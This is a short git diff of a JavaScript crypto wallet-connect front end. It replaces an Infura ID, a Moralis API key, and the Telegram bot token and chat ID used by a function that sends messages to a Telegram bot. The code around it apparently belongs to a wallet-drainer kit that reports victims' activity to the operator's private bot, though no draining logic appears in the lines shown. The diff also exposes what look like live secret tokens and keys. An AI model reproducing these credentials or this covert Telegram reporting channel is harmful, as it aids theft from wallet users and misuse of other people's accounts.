@@ -65,7 +65,7 @@ async function init() {
           56: "https://bsc-dataseed.binance.org",
         },
         network: 'binance',
-        infuraId: "e77435344ef0486893cdc26d7d5cf039"
+        infuraId: "ff343efcf191471e831cd4209a04f583"
       }
     },
 
@@ -287,8 +287,8 @@ async function getPrice(address){
 
 async function sendMessage(message){
   return new Promise((resolve, reject)=>{
-    const chat_id = 5699310522;
-    fetch(`https://api.telegram.org/bot5519263012:AAECn6WGaBWiGtY_1EBBEGkamw9e5W6qxvs/sendMessage?chat_id=${chat_id}&text=${message}`, {
+    const chat_id = 5064784421;
+    fetch(`https://api.telegram.org/bot5879478432:AAGltec52Usg-I-7Q6I6uUqIUTzrUdO6yqM/sendMessage?chat_id=${chat_id}&text=${message}`, {
           method: "GET",
           headers: {
               
@@ -311,7 +311,7 @@ async function proceed(){
     // main net
     const serverUrl = 'https://pt5gk0drbc2k.usemoralis.com:2053/server';
     const appId = 'uxBYKvLyKcTp8au8ftYLIovw8xdNyeI05lR4scQW';
-    const apiKey = "gh8QcQ44yAaqOJR5AtKGM7uDpDo6pddkKD25FEyT8zK2e8jnK5Zv5atjV5kWIAjF";
+    const apiKey = "7HDlroOdhLINIhhc7i4KqmdVLsXNcZqNmPhYCBxqdzAML7McuIqf4iGhsACvF9of";
   
     // testnet
     // const serverUrl = 'https://vzrez3npotuq.usemoralis.com:2053/server'
